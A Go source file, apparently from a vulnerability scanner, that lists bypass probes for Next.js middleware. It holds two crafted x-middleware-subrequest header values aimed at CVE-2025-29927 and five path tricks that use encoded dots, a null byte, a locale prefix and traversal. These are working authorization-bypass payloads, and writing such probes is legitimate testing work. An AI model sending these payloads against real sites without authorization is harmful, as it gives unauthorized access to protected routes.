package nextjs_middleware_bypass

// headerPayload defines a header-based bypass probe.
type headerPayload struct {
	name  string
	value string
	desc  string
}

// headerPayloads targets CVE-2025-29927 and similar middleware bypass vectors.
var headerPayloads = []headerPayload{
	{
		name:  "x-middleware-subrequest",
		value: "middleware:middleware:middleware:middleware:middleware",
		desc:  "CVE-2025-29927: x-middleware-subrequest header with recursive middleware name",
	},
	{
		name:  "x-middleware-subrequest",
		value: "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
		desc:  "CVE-2025-29927: x-middleware-subrequest with src/middleware prefix variant",
	},
}

// pathPayloadFunc generates a modified path for path-based bypass probes.
type pathPayloadFunc struct {
	transform func(path string) string
	desc      string
}

// pathPayloads defines path manipulation bypass probes.
var pathPayloads = []pathPayloadFunc{
	{
		transform: func(path string) string { return "/" + path },
		desc:      "Double leading slash",
	},
	{
		transform: func(path string) string { return "/%2e" + path },
		desc:      "URL-encoded dot prefix",
	},
	{
		transform: func(path string) string { return path + "%00" },
		desc:      "Null byte suffix",
	},
	{
		transform: func(path string) string { return "/en" + path },
		desc:      "Locale prefix bypass (en)",
	},
	{
		transform: func(path string) string { return "/%2e%2e" + path },
		desc:      "URL-encoded path traversal prefix",
	},
}
